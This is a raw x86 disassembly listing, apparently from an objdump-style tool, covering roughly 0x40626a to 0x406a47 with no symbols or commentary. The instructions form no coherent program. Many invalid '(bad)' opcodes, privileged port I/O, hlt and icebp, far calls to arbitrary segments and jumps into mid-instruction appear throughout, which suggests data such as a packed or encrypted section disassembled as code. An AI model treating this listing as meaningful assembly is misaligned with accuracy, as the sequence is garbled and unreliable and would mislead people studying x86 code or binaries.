  40626a:	bound  edx,QWORD PTR [eax]
  40626c:	les    edi,FWORD PTR [ebx+0x3]
  40626f:	sar    BYTE PTR [eax+ebx*8+0x65],cl
  406273:	hlt    
  406274:	add    edi,DWORD PTR ds:0x5bdcf2cb
  40627a:	adc    al,0x74
  40627c:	icebp  
  40627d:	sti    
  40627e:	addr16 dec ecx
  406280:	popa   
  406281:	push   0xbce43c04
  406286:	xchg   BYTE PTR [edi],dh
  406288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406289:	push   ss
  40628a:	cmp    ebp,DWORD PTR [esi-0x22]
  40628d:	retf   
  40628e:	jg     0x40627a
  406290:	mov    cl,0x21
  406292:	and    esi,DWORD PTR [ebp-0x6d12f5d1]
  406298:	dec    edx
  406299:	not    BYTE PTR [ebx-0x7e]
  40629c:	ret    0x72e6
  40629f:	mov    eax,0xc91d300c
  4062a4:	sbb    al,0xcc
  4062a6:	std    
  4062a7:	(bad)  
  4062a8:	rcl    DWORD PTR [bx+di+0x1979],0x46
  4062ae:	dec    ebx
  4062af:	iret   
  4062b0:	or     ecx,DWORD PTR [esi]
  4062b2:	and    BYTE PTR [esi+0x3f],cl
  4062b5:	std    
  4062b6:	stc    
  4062b7:	sub    ecx,ecx
  4062b9:	les    esp,FWORD PTR [ebp+0x6f]
  4062bc:	scas   al,BYTE PTR es:[edi]
  4062bd:	push   edi
  4062be:	inc    cx
  4062c0:	data16 fcom DWORD PTR [ebp+0x8]
  4062c4:	in     eax,dx
  4062c5:	pusha  
  4062c6:	and    esi,DWORD PTR ss:[esi-0x4]
  4062ca:	sub    DWORD PTR [eax],0xe38c5235
  4062d0:	mov    bh,0x96
  4062d2:	and    ch,BYTE PTR [ebp+0x7]
  4062d5:	push   ebx
  4062d6:	in     al,dx
  4062d7:	jb     0x406314
  4062d9:	sub    al,bl
  4062db:	in     al,dx
  4062dc:	dec    esp
  4062dd:	(bad)  
  4062de:	hlt    
  4062df:	xor    eax,0xc7365860
  4062e4:	or     bl,BYTE PTR [ebx-0x59]
  4062e7:	mov    edi,0xe760cb18
  4062ec:	and    BYTE PTR [edx],al
  4062ee:	add    edx,DWORD PTR [ebx+0x261b6971]
  4062f4:	push   ebx
  4062f5:	cwde   
  4062f6:	and    eax,0xbce7ae02
  4062fb:	retf   
  4062fc:	stc    
  4062fd:	dec    esp
  4062fe:	adc    BYTE PTR [ecx-0x6443a5f1],0x7a
  406305:	mov    ch,0xab
  406307:	inc    edi
  406308:	push   0xb359102a
  40630d:	loop   0x40634d
  40630f:	mov    ebp,0x5b61433a
  406314:	jmp    0x5828afd5
  406319:	sub    ch,BYTE PTR [esi]
  40631b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40631c:	jecxz  0x4062d2
  40631e:	or     BYTE PTR [eax+0xbfcf2c9],ch
  406324:	out    dx,eax
  406325:	adc    eax,0xb7bdc4f
  40632a:	mov    bh,0x9f
  40632c:	test   BYTE PTR [ebx+0x39],bl
  40632f:	jecxz  0x406353
  406331:	les    ebx,FWORD PTR [ecx+0x5f2725c8]
  406337:	xchg   ebp,eax
  406338:	xor    DWORD PTR [ecx],eax
  40633a:	daa    
  40633b:	ror    BYTE PTR [ebx-0x1c],1
  40633e:	out    dx,eax
  40633f:	clc    
  406340:	push   esi
  406341:	and    DWORD PTR [esi+0x27c6ddc],edi
  406347:	sbb    bh,BYTE PTR [ebp+0x7fb2f007]
  40634d:	cmc    
  40634e:	lahf   
  40634f:	xchg   ecx,eax
  406350:	pop    edi
  406351:	mov    cl,0x53
  406353:	out    0xb6,al
  406355:	imul   esp,DWORD PTR [eax+0x67],0xfffffff4
  406359:	popf   
  40635a:	(bad)  
  40635b:	out    dx,eax
  40635c:	jae    0x40635f
  40635e:	mov    ds:0x24a37f81,eax
  406363:	mov    ecx,0x1a45d488
  406368:	cld    
  406369:	adc    BYTE PTR [edx-0x1a],bh
  40636c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40636d:	dec    eax
  40636e:	cdq    
  40636f:	or     al,0x67
  406371:	xor    ecx,DWORD PTR [ebp+0x7aed1add]
  406377:	scas   al,BYTE PTR es:[edi]
  406378:	pop    ss
  406379:	js     0x406331
  40637b:	gs (bad) 
  40637f:	loope  0x40633a
  406381:	enter  0xc39e,0x7
  406385:	sub    BYTE PTR [ecx+0x59f60549],bl
  40638b:	or     BYTE PTR [ebp-0xd],al
  40638e:	xor    BYTE PTR [esi],cl
  406390:	push   ebx
  406391:	or     al,0x16
  406393:	sbb    dl,dh
  406395:	add    esi,ecx
  406397:	and    al,0xad
  406399:	loope  0x406367
  40639b:	cmp    ah,BYTE PTR [edx-0x53]
  40639e:	pop    eax
  40639f:	cld    
  4063a0:	or     ebx,ebp
  4063a2:	dec    ebp
  4063a3:	mov    eax,esi
  4063a5:	fisttp QWORD PTR fs:0xa418b260
  4063ac:	dec    ebx
  4063ad:	hlt    
  4063ae:	fcomp  QWORD PTR [esi+0x7a9f4b28]
  4063b4:	push   edx
  4063b5:	shr    esp,1
  4063b7:	mov    ds:0x18ccd2fa,eax
  4063bc:	pop    ecx
  4063bd:	jmp    0x40636a
  4063bf:	ffree  st(5)
  4063c1:	xor    BYTE PTR [esi+0x40],dl
  4063c4:	push   es
  4063c5:	jbe    0x406387
  4063c7:	int    0xb9
  4063c9:	xchg   edi,eax
  4063ca:	dec    edx
  4063cb:	in     al,dx
  4063cc:	adc    bh,BYTE PTR gs:[eax]
  4063cf:	loope  0x406359
  4063d1:	mov    ds:0x210788a,al
  4063d6:	outs   dx,DWORD PTR ds:[esi]
  4063d7:	xchg   ecx,eax
  4063d8:	xchg   ebx,eax
  4063d9:	dec    edi
  4063da:	adc    eax,0x5a0c026d
  4063df:	imul   esp,DWORD PTR [edx],0xc8a1113f
  4063e5:	fwait
  4063e6:	pop    esp
  4063e7:	inc    edi
  4063e8:	fwait
  4063e9:	not    DWORD PTR [ecx+0x42]
  4063ec:	cmp    ah,cl
  4063ee:	and    al,0xe7
  4063f0:	leave  
  4063f1:	xor    DWORD PTR [esi],ebp
  4063f3:	(bad)  
  4063f4:	jecxz  0x40638c
  4063f6:	loop   0x4063ff
  4063f8:	mov    bl,bl
  4063fa:	stos   BYTE PTR es:[edi],al
  4063fb:	jmp    0x40642d
  4063fd:	fisub  WORD PTR [ebp-0x44]
  406400:	test   BYTE PTR [ebx+edi*8],ah
  406403:	(bad)  
  406404:	es mov ah,0xbd
  406407:	loopne 0x40646c
  406409:	or     eax,0x18292358
  40640e:	lods   eax,DWORD PTR ds:[esi]
  40640f:	push   ebx
  406410:	jb     0x4063ac
  406412:	or     cl,BYTE PTR [ecx-0x7d469b15]
  406418:	push   es
  406419:	sbb    DWORD PTR [edx+0x1d99d2d],0x26
  406420:	adc    bl,ah
  406422:	adc    DWORD PTR [eax-0x6e111bc7],0x821b43d9
  40642c:	test   DWORD PTR [ebx+eax*1],0xa5c76449
  406433:	jo     0x4063c9
  406435:	add    DWORD PTR [ebp+esi*1-0x56],eax
  406439:	shl    esi,0x72
  40643c:	xchg   ebp,eax
  40643d:	cmp    DWORD PTR [esp+ecx*1],0x44
  406441:	mov    esp,0x75de0667
  406446:	mov    DWORD PTR ds:0x24096fa,edi
  40644c:	icebp  
  40644d:	mov    esp,DWORD PTR [eax+0x71cba6c]
  406453:	pop    esi
  406454:	push   ebp
  406455:	jo     0x40646f
  406457:	mov    ds:0xcd334702,al
  40645c:	bound  ecx,QWORD PTR [ecx+0x4cbfb4e8]
  406462:	pop    ecx
  406463:	cmp    ch,bl
  406465:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406466:	into   
  406467:	and    ebp,DWORD PTR [edx+0x38]
  40646a:	dec    esi
  40646b:	mov    eax,ecx
  40646d:	imul   ebx,DWORD PTR [esp+edi*2-0x30c8d1c9],0xad106212
  406478:	xor    DWORD PTR [edi+0x27],ebp
  40647b:	xor    eax,0xf3e98e6e
  406480:	push   eax
  406481:	lds    esp,FWORD PTR [ecx]
  406483:	mov    cl,0x8b
  406485:	loop   0x4064f4
  406487:	pop    ebx
  406488:	icebp  
  406489:	cmp    al,dh
  40648b:	fnsave [eax-0x20c9b53d]
  406491:	mov    cl,0xe5
  406493:	repnz inc ebx
  406495:	dec    ebp
  406496:	mov    ds:0x98bed6fa,eax
  40649b:	pop    ecx
  40649c:	xchg   BYTE PTR [ebp-0x55],dl
  40649f:	or     ch,BYTE PTR [edi]
  4064a1:	lods   al,BYTE PTR ds:[esi]
  4064a2:	aam    0x2e
  4064a4:	leave  
  4064a5:	and    al,0x40
  4064a7:	ja     0x4064e6
  4064a9:	(bad)  
  4064ab:	jns    0x406444
  4064ad:	std    
  4064ae:	pop    ebp
  4064af:	adc    al,0x4b
  4064b1:	and    dh,BYTE PTR [edx+esi*4]
  4064b4:	fadd   st(0),st
  4064b6:	mov    ebx,DWORD PTR [esi+0x5]
  4064b9:	out    0x1c,al
  4064bb:	jo     0x40649f
  4064bd:	shl    DWORD PTR [edi-0x57],1
  4064c0:	pop    edi
  4064c1:	or     eax,0x83056d95
  4064c6:	stos   BYTE PTR es:[edi],al
  4064c7:	popa   
  4064c8:	and    esp,DWORD PTR [ebp+0x24]
  4064cb:	push   edi
  4064cc:	add    dh,BYTE PTR [ebx+edi*8-0x2d2b14c4]
  4064d3:	sbb    bh,BYTE PTR [esi-0x25]
  4064d6:	xchg   BYTE PTR [esi+0xe400908],bl
  4064dc:	shr    DWORD PTR [edi+edx*8+0x13a4d068],cl
  4064e3:	lea    ebp,[ebx-0x2b]
  4064e6:	and    ch,BYTE PTR [edi]
  4064e8:	push   edi
  4064e9:	inc    esp
  4064ea:	xchg   ebx,eax
  4064eb:	cmc    
  4064ec:	dec    esi
  4064ed:	lods   al,BYTE PTR ds:[esi]
  4064ee:	ja     0x40650a
  4064f0:	sbb    ebp,ebx
  4064f2:	mov    ecx,0xb1d80bdb
  4064f7:	xchg   edx,eax
  4064f8:	in     eax,dx
  4064f9:	mov    eax,0xc04c270
  4064fe:	into   
  4064ff:	dec    eax
  406500:	fsubr  QWORD PTR [esi-0x53b4f460]
  406506:	lea    ebx,[ecx-0x1d]
  406509:	ror    DWORD PTR [ebx-0x55],0x81
  40650d:	mov    al,0xad
  40650f:	and    al,0x98
  406511:	out    dx,al
  406512:	(bad)  
  406513:	(bad)  
  406514:	mov    ebx,0x9e652b96
  406519:	push   ecx
  40651a:	out    dx,eax
  40651b:	fcmovbe st,st(5)
  40651d:	fst    st(0)
  40651f:	mov    ebp,0x25297ff8
  406524:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406525:	jp     0x40652a
  406527:	xchg   edi,eax
  406528:	aas    
  406529:	sahf   
  40652a:	rcl    ch,1
  40652c:	ret    
  40652d:	xchg   ebx,eax
  40652e:	push   ds
  40652f:	pop    ss
  406530:	bound  ecx,QWORD PTR [eax]
  406532:	mov    dh,0x3
  406534:	push   edi
  406535:	push   ecx
  406536:	mov    ds:0x54e0d569,eax
  40653b:	pop    eax
  40653c:	mov    ecx,DWORD PTR [ebx]
  40653e:	adc    DWORD PTR [edi],ebx
  406540:	clc    
  406541:	lds    esi,FWORD PTR [edx-0x37]
  406544:	mov    al,ds:0x7b5ebc18
  406549:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40654a:	fcom   st(7)
  40654c:	cwde   
  40654d:	pop    ebx
  40654e:	sbb    dl,BYTE PTR ds:[esi]
  406551:	push   cs
  406552:	or     eax,0xfbbe287d
  406557:	in     al,0x35
  406559:	in     al,0xb5
  40655b:	pop    ds
  40655c:	enter  0xc73f,0xee
  406560:	xchg   ebx,eax
  406561:	(bad)  
  406562:	(bad)  
  406563:	retf   0x53f
  406566:	fs mov dl,0xb3
  406569:	ss dec esp
  40656b:	scas   eax,DWORD PTR es:[edi]
  40656c:	sbb    eax,0x743b6f22
  406571:	lods   eax,DWORD PTR ds:[esi]
  406572:	cmp    ebx,eax
  406574:	dec    ebx
  406575:	pop    edi
  406576:	push   edx
  406577:	inc    esi
  406578:	adc    eax,0x1245dd5a
  40657d:	scas   eax,DWORD PTR es:[edi]
  40657e:	sub    DWORD PTR [edx],ebx
  406580:	jb     0x406554
  406582:	dec    eax
  406583:	jg     0x4065e4
  406585:	pop    ebx
  406586:	xor    ecx,DWORD PTR [bx+di]
  406589:	add    DWORD PTR [ecx],0x1655b59e
  40658f:	popf   
  406590:	cmp    bh,0xcf
  406593:	fucomi st,st(3)
  406595:	mov    edx,0xcfe0e5f4
  40659a:	dec    BYTE PTR [eax-0x36]
  40659d:	xchg   BYTE PTR [eax-0x5eb74cad],ch
  4065a3:	sbb    eax,0x323f68a
  4065a8:	mov    esp,0x7b75bbe7
  4065ad:	mov    eax,0xfad5cb38
  4065b2:	out    0xa0,al
  4065b4:	push   ebx
  4065b5:	fistp  WORD PTR [edx+esi*1+0x53ee9e57]
  4065bc:	mov    edi,0x61d2e2de
  4065c1:	cs push edi
  4065c3:	inc    edx
  4065c4:	not    BYTE PTR [esi]
  4065c6:	push   es
  4065c7:	test   bl,0x51
  4065ca:	fdiv   QWORD PTR [ebp+0x6eb3c217]
  4065d0:	loope  0x40664c
  4065d2:	imul   edi,edx,0x859f9b18
  4065d8:	mov    dh,0x56
  4065da:	xchg   edx,eax
  4065db:	push   es
  4065dc:	mov    ah,0x7e
  4065de:	mov    edx,0x5178e6bc
  4065e3:	adc    BYTE PTR [esi+0x733c1875],dh
  4065e9:	or     ecx,edx
  4065eb:	pop    edi
  4065ec:	sub    eax,0x41b69604
  4065f1:	mov    ebx,0x6baf24dd
  4065f6:	call   0xe00d:0x5dcaeb83
  4065fd:	stos   DWORD PTR es:[edi],eax
  4065fe:	mov    eax,ds:0xbf4e7e73
  406603:	mov    eax,ds:0x9ad4a838
  406608:	dec    eax
  406609:	mov    ecx,0x7cb21933
  40660e:	mov    bl,0x4c
  406610:	(bad)  
  406612:	jp     0x40666e
  406614:	ins    DWORD PTR es:[edi],dx
  406615:	push   ecx
  406616:	repz ror al,1
  406619:	add    edx,esi
  40661b:	pop    ss
  40661c:	mov    ebp,0x957d0e00
  406621:	out    dx,al
  406622:	mov    ch,dh
  406624:	add    bh,BYTE PTR [eax+ebp*2+0x4db51aac]
  40662b:	xchg   edx,eax
  40662c:	pusha  
  40662d:	push   ebp
  40662e:	mov    dh,0x3d
  406630:	dec    BYTE PTR [ebp-0x57]
  406633:	les    edx,FWORD PTR [eax]
  406635:	push   eax
  406636:	fbld   TBYTE PTR [eax-0x66]
  406639:	(bad)  
  40663b:	cmp    dl,BYTE PTR [eax]
  40663d:	mov    dl,0xc5
  40663f:	xchg   edx,eax
  406640:	or     BYTE PTR [edi+eax*8],ch
  406643:	mov    eax,ds:0x2361084e
  406648:	loopne 0x4066af
  40664a:	rcr    ebp,cl
  40664c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40664d:	xchg   ebx,eax
  40664e:	js     0x40666f
  406650:	loope  0x406610
  406652:	inc    ecx
  406653:	cdq    
  406654:	clc    
  406655:	cmp    al,BYTE PTR [edi-0x783e2805]
  40665b:	shr    DWORD PTR [esi],1
  40665d:	jo     0x406639
  40665f:	and    DWORD PTR [ebx],ecx
  406661:	arpl   WORD PTR [ebx-0xeea6be7],dx
  406667:	rcl    BYTE PTR [ecx],0xa0
  40666a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40666b:	push   ss
  40666c:	call   0x5c39:0xbf476caf
  406673:	ins    BYTE PTR es:[edi],dx
  406674:	pop    ebp
  406675:	dec    eax
  406676:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406677:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406678:	and    eax,0x6ec5d011
  40667d:	or     BYTE PTR [edx],dh
  40667f:	xor    ebp,DWORD PTR [eax]
  406681:	cmp    ecx,DWORD PTR [ecx+0x1d1b6a1f]
  406687:	sub    al,0xb5
  406689:	hlt    
  40668a:	push   0x41
  40668c:	stc    
  40668d:	pop    edi
  40668e:	retf   0x7759
  406691:	out    dx,al
  406692:	les    edx,FWORD PTR [ebx-0x4bcd72ad]
  406698:	jl     0x406683
  40669a:	(bad)  [esp+eax*4+0x2c]
  40669e:	popf   
  40669f:	loop   0x4066eb
  4066a1:	rcr    BYTE PTR [ebx],1
  4066a3:	sbb    eax,0x35e49f88
  4066a8:	aad    0x47
  4066aa:	pavgw  mm3,QWORD PTR [esp]
  4066ae:	shr    BYTE PTR [esp+edx*8-0x28],0xc2
  4066b3:	add    dl,ch
  4066b5:	inc    esi
  4066b6:	and    eax,0x925a7ac6
  4066bb:	mov    DWORD PTR fs:[ebx+ebx*8+0x1d],ebx
  4066c0:	gs (bad) 
  4066c2:	bnd data16 jp 0x4066bc
  4066c6:	and    al,0x71
  4066c8:	(bad)  
  4066c9:	lods   al,BYTE PTR ds:[esi]
  4066ca:	xchg   ecx,eax
  4066cb:	lahf   
  4066cc:	cwde   
  4066cd:	into   
  4066ce:	jge    0x4066b0
  4066d0:	xchg   ebx,eax
  4066d1:	(bad)  
  4066d2:	mov    bl,0x4d
  4066d4:	and    bl,al
  4066d6:	sbb    eax,0xbe39e0fd
  4066db:	jge    0x406712
  4066dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066de:	jecxz  0x40667d
  4066e0:	sub    ecx,DWORD PTR [ecx]
  4066e2:	ja     0x40666d
  4066e4:	loope  0x406697
  4066e6:	jns    0x40668d
  4066e8:	dec    esi
  4066e9:	out    dx,al
  4066ea:	popf   
  4066eb:	stc    
  4066ec:	lock mov eax,0x53d36881
  4066f2:	jnp    0x4066a7
  4066f4:	ins    BYTE PTR es:[edi],dx
  4066f5:	sbb    cl,BYTE PTR [edi-0x75]
  4066f8:	pushf  
  4066f9:	es fucomip st,st(5)
  4066fc:	mov    ds:0x2bf17f31,al
  406701:	lds    ebx,FWORD PTR [ebx+0x6b]
  406704:	adc    ebp,DWORD PTR [ebp+0x34]
  406707:	xchg   esi,eax
  406708:	add    edx,DWORD PTR [edi]
  40670a:	add    al,0x4
  40670c:	in     eax,dx
  40670d:	repz cli 
  40670f:	ins    BYTE PTR es:[edi],dx
  406710:	cmp    eax,0xce820d68
  406715:	sar    BYTE PTR [edx],0x78
  406718:	leave  
  406719:	repz and DWORD PTR [ebp-0x61],ebx
  40671d:	mov    ah,0x42
  40671f:	push   ebp
  406720:	addr16 xchg esp,ebx
  406723:	dec    ebx
  406724:	mov    ecx,0x7b77f1a3
  406729:	push   fs
  40672b:	mov    dh,0xaf
  40672d:	jl     0x4066b7
  40672f:	rol    DWORD PTR [edx],cl
  406731:	popf   
  406732:	cmp    edx,DWORD PTR [ebx-0x3460a57]
  406738:	int    0xa3
  40673a:	cmp    BYTE PTR [esi-0x68af153b],bh
  406740:	outs   dx,DWORD PTR ds:[esi]
  406741:	scas   eax,DWORD PTR es:[edi]
  406742:	repz xchg ecx,eax
  406744:	sbb    esp,edx
  406746:	push   edi
  406747:	push   eax
  406748:	fwait
  406749:	scas   eax,DWORD PTR es:[edi]
  40674a:	add    bl,BYTE PTR [edi+0x44f52096]
  406750:	jl     0x406779
  406752:	mov    bh,0x4b
  406754:	or     dh,al
  406756:	push   esi
  406757:	mov    esi,0xeccd61cc
  40675c:	pop    ebp
  40675d:	cmp    esp,DWORD PTR [esi-0x4d]
  406760:	and    edi,ebx
  406762:	mov    esi,0xdf360045
  406767:	mov    al,0xa6
  406769:	push   eax
  40676a:	or     cl,0xca
  40676d:	fbld   TBYTE PTR [ebp+0x33]
  406770:	xchg   ebp,eax
  406771:	fisub  DWORD PTR [edx]
  406773:	inc    ebx
  406774:	out    dx,al
  406775:	inc    eax
  406776:	mov    esi,cs
  406778:	adc    esi,DWORD PTR [eax]
  40677a:	dec    edi
  40677b:	jno    0x406771
  40677d:	loopne 0x406775
  40677f:	js     0x4067d7
  406781:	adc    ecx,edx
  406783:	loop   0x4067c4
  406785:	out    0xb,al
  406787:	adc    esp,DWORD PTR [esi]
  406789:	dec    ebx
  40678a:	push   0xffffff86
  40678c:	aam    0x3d
  40678e:	dec    esi
  40678f:	scas   eax,DWORD PTR es:[edi]
  406790:	shl    BYTE PTR [ebx+0x69],cl
  406793:	push   ebp
  406794:	mov    edi,DWORD PTR [ebp+0x24e93344]
  40679a:	pop    ecx
  40679b:	push   edi
  40679c:	ficomp WORD PTR [ecx]
  40679e:	push   edx
  40679f:	jno    0x40675f
  4067a1:	adc    ch,0x75
  4067a4:	int3   
  4067a5:	mov    al,0xf5
  4067a7:	lods   al,BYTE PTR ds:[esi]
  4067a8:	fwait
  4067a9:	scas   al,BYTE PTR es:[edi]
  4067aa:	jle    0x406770
  4067ac:	mov    ebx,DWORD PTR ds:0xf608ee57
  4067b2:	mov    edi,0x3f9811d1
  4067b7:	fist   DWORD PTR [ebx]
  4067b9:	xor    BYTE PTR [ebp+0xf],0xa5
  4067bd:	inc    ebp
  4067be:	inc    eax
  4067bf:	repnz fmul DWORD PTR gs:[eax+0x4f]
  4067c4:	and    edi,esp
  4067c6:	call   0x77a78005
  4067cb:	call   0xa915:0xd87d05fe
  4067d2:	jle    0x40679a
  4067d4:	xor    al,0xb6
  4067d6:	mov    cl,0xad
  4067d8:	sub    ch,BYTE PTR [ecx+0x5fafb505]
  4067de:	sub    ebx,edi
  4067e0:	jge    0x406852
  4067e2:	repnz xchg esi,eax
  4067e4:	lea    esi,[eax-0x37]
  4067e7:	(bad)  
  4067e8:	jmp    0x406822
  4067ea:	imul   esp
  4067ec:	push   eax
  4067ed:	push   esp
  4067ee:	arpl   WORD PTR ds:0xdec5dbe4,dx
  4067f4:	xchg   ebx,eax
  4067f5:	out    0xff,al
  4067f7:	sbb    DWORD PTR [edi-0x58fd6466],ebx
  4067fd:	enter  0x907,0x94
  406801:	and    al,0x1d
  406803:	dec    esp
  406804:	cmp    eax,0x5a740819
  406809:	mov    al,ds:0xf5ebed9c
  40680e:	dec    esi
  40680f:	cmp    al,0xe2
  406811:	mov    WORD PTR [ebx-0x1b136f95],fs
  406817:	sub    BYTE PTR [ecx+0x560b3286],ch
  40681d:	and    BYTE PTR ds:0x8e1101b7,bh
  406823:	jmp    0x3bdce9e3
  406828:	jmp    0x5fad9b77
  40682d:	pop    es
  40682e:	push   ds
  40682f:	xor    al,0x93
  406831:	and    esi,eax
  406833:	stc    
  406834:	test   DWORD PTR [ebp-0xf8c4995],eax
  40683a:	dec    edx
  40683b:	xlat   BYTE PTR ds:[ebx]
  40683c:	clc    
  40683d:	ret    
  40683e:	retf   
  40683f:	in     al,0xe1
  406841:	inc    ebx
  406842:	pop    ebx
  406843:	or     BYTE PTR [esi],ch
  406845:	out    0xba,al
  406847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406848:	out    0xe7,ax
  40684b:	sbb    bl,BYTE PTR [ebx-0x7e]
  40684e:	and    al,0x8a
  406850:	mov    ebx,0x244aa634
  406855:	fdiv   DWORD PTR [edx+0x37]
  406858:	pop    edx
  406859:	mov    ecx,0xe1854d47
  40685e:	jns    0x4067f3
  406860:	and    cl,BYTE PTR [edx]
  406862:	test   al,0x82
  406864:	sub    edi,edi
  406866:	stc    
  406867:	inc    edi
  406868:	and    esi,eax
  40686a:	sar    BYTE PTR [eax-0xc],cl
  40686d:	daa    
  40686e:	adc    esi,DWORD PTR [edi+0x28fe1efb]
  406874:	cld    
  406875:	imul   BYTE PTR [esi-0x71]
  406878:	sub    al,0x78
  40687a:	call   0x5b2ed6f5
  40687f:	mov    ebp,0x720adb9d
  406884:	jb     0x40684a
  406886:	repnz add edi,0x23
  40688a:	jle    0x406823
  40688c:	(bad)  
  40688d:	loope  0x4068e0
  40688f:	ins    DWORD PTR es:[edi],dx
  406890:	jnp    0x406830
  406892:	mov    al,bh
  406894:	ins    BYTE PTR es:[edi],dx
  406895:	not    BYTE PTR [edx+0x1c]
  406898:	pop    ds
  406899:	adc    DWORD PTR [eax],edx
  40689b:	out    0x91,eax
  40689d:	lds    eax,FWORD PTR ds:0x81056b26
  4068a3:	call   0x505c9b4f
  4068a8:	dec    ebp
  4068a9:	sahf   
  4068aa:	sbb    eax,0x12a0ff93
  4068af:	mov    al,0x9c
  4068b1:	aam    0xba
  4068b3:	nop
  4068b4:	mov    dl,0x3
  4068b6:	addr16 jge 0x4068fd
  4068b9:	push   0x4a99fba5
  4068be:	mov    ds:0x70c8f1c1,eax
  4068c3:	add    ah,dh
  4068c5:	or     al,0x34
  4068c7:	mov    esp,0xee65db83
  4068cc:	loopne 0x40694c
  4068ce:	retf   0x56d6
  4068d1:	loope  0x40691e
  4068d3:	jmp    0x1afb1a9f
  4068d8:	cs pusha 
  4068da:	ss hlt 
  4068dc:	push   edx
  4068dd:	jne    0x4068a2
  4068df:	cmp    BYTE PTR [eax+0x47],bh
  4068e2:	add    DWORD PTR [edx],ecx
  4068e4:	push   es
  4068e5:	jmp    0xfad1:0x72d9b9a4
  4068ec:	inc    ebp
  4068ed:	pop    edi
  4068ee:	xchg   BYTE PTR [eax-0x771785ff],cl
  4068f4:	jl     0x4068d2
  4068f6:	cmp    esi,esi
  4068f8:	jb     0x4068cc
  4068fa:	pop    sp
  4068fc:	cmp    bh,bl
  4068fe:	(bad)  [ebx-0x2c]
  406901:	mov    WORD PTR [ecx-0x11],?
  406904:	lea    ebx,[ecx-0x53]
  406907:	push   ebx
  406908:	inc    edx
  406909:	test   BYTE PTR [ebp+esi*4-0x62],bh
  40690d:	sbb    esp,DWORD PTR [ebp-0xc]
  406910:	sbb    DWORD PTR [edi+0xb],0x14
  406914:	dec    eax
  406915:	jbe    0x40690d
  406917:	push   eax
  406918:	retf   0x4423
  40691b:	add    eax,0x387bc628
  406920:	in     eax,dx
  406921:	retf   
  406922:	sbb    eax,esi
  406924:	add    edi,eax
  406926:	dec    edi
  406927:	pushw  es
  406929:	lock stc 
  40692b:	lahf   
  40692c:	mov    bl,al
  40692e:	or     ecx,DWORD PTR [edi+0x4379c863]
  406934:	push   eax
  406935:	in     al,dx
  406936:	mov    bh,0x15
  406938:	jl     0x4068c1
  40693a:	pop    es
  40693b:	in     al,dx
  40693c:	in     al,0xf8
  40693e:	dec    edx
  40693f:	aam    0x6d
  406941:	jnp    0x406973
  406943:	dec    esi
  406944:	sbb    esp,0xffffffa5
  406947:	inc    edx
  406948:	call   0x1859:0x77080d11
  40694f:	sbb    esi,esp
  406951:	test   eax,0x1612ed53
  406956:	and    bl,BYTE PTR [ecx-0x4d]
  406959:	call   0x1f18:0x64b540d7
  406960:	es aas 
  406962:	cmp    DWORD PTR [ebx+0x54fcef97],0x971fcd58
  40696c:	push   ebp
  40696d:	outs   dx,BYTE PTR ds:[esi]
  40696e:	mov    cl,0x7e
  406970:	in     eax,0xc7
  406972:	jp     0x40698c
  406974:	and    eax,0xecd7a142
  406979:	stos   BYTE PTR es:[edi],al
  40697a:	cmp    eax,DWORD PTR ds:0x4cb49571
  406980:	push   edx
  406981:	in     al,0xeb
  406983:	cmp    eax,0x36ff26eb
  406988:	aad    0xfd
  40698a:	add    esp,0x97774b87
  406990:	adc    ebx,ebp
  406992:	sub    al,0xd4
  406994:	add    al,0x47
  406996:	push   es
  406997:	call   ebx
  406999:	inc    ebp
  40699a:	sar    ebx,1
  40699c:	cmp    ah,BYTE PTR [edx+0x1e36c9cf]
  4069a2:	jne    0x406952
  4069a4:	call   0xa7b4f33a
  4069a9:	push   0xffffffd0
  4069ab:	cdq    
  4069ac:	mov    ah,0x48
  4069ae:	mov    esp,0x84dece7b
  4069b3:	add    eax,0x420701da
  4069b8:	xchg   edi,eax
  4069b9:	xchg   dl,ah
  4069bb:	inc    esi
  4069bc:	push   edi
  4069bd:	inc    eax
  4069be:	cli    
  4069bf:	and    BYTE PTR [esi],dl
  4069c1:	mov    al,0x53
  4069c3:	jg     0x406a16
  4069c5:	push   esp
  4069c6:	jmp    0x3d6f5203
  4069cb:	rcl    BYTE PTR [eax+0x61ce399c],cl
  4069d1:	inc    ebp
  4069d2:	shr    BYTE PTR [ecx-0x205006bb],cl
  4069d8:	outs   dx,BYTE PTR ds:[esi]
  4069d9:	xlat   BYTE PTR ds:[ebx]
  4069da:	call   0x8dbd:0x23bafb1
  4069e1:	inc    esp
  4069e2:	imul   eax,ecx,0xe6defb29
  4069e8:	and    eax,0xc135e25f
  4069ed:	add    edx,DWORD PTR [eax+edx*8-0x73d859cc]
  4069f4:	outs   dx,BYTE PTR ds:[esi]
  4069f5:	loop   0x4069d3
  4069f7:	mov    bh,al
  4069f9:	jg     0x406a73
  4069fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069fc:	sub    bh,ah
  4069fe:	invd   
  406a00:	cmp    BYTE PTR [ebp-0x43c0e115],bl
  406a06:	repz scas al,BYTE PTR es:[edi]
  406a08:	xor    DWORD PTR [ecx-0x82e9920],esi
  406a0e:	sub    BYTE PTR [edx-0x35],bh
  406a11:	push   cs
  406a12:	pop    ss
  406a13:	pop    esi
  406a14:	pop    ecx
  406a15:	stos   DWORD PTR es:[edi],eax
  406a16:	not    BYTE PTR [edi+0x4367f37f]
  406a1c:	inc    ebp
  406a1d:	rcr    BYTE PTR [edx+0x326e8c46],cl
  406a23:	xacquire xchg DWORD PTR [ebx+esi*2+0x6b7bb1ae],ebx
  406a2b:	loop   0x406a82
  406a2d:	mov    ds:0xbaf03356,al
  406a32:	xchg   DWORD PTR [eax-0x3fc563c6],ecx
  406a38:	mov    ch,0xfb
  406a3a:	frstor [ebp+0x47]
  406a3d:	or     bl,BYTE PTR [edx-0x103ae011]
  406a43:	stos   BYTE PTR es:[edi],al
  406a44:	jo     0x406a6b
  406a46:	das    
  406a47:	mov    cl,0x64
